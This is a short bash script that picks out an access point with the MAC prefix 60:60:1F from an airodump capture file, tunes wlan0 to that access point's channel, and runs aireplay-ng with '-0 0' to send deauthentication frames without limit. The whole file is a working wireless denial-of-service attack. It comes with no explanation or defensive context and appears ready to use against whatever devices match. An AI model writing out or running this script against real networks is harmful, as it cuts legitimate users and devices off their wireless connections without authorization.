#!/bin/bash

pkill xterm
pkill airodump
apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
apCh=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 4)
echo $apCh
sudo ifconfig wlan0 down
sudo iwconfig wlan0 channel $apCh
sudo xterm -hold -e aireplay-ng -0 0 -a $apMAC wlan0
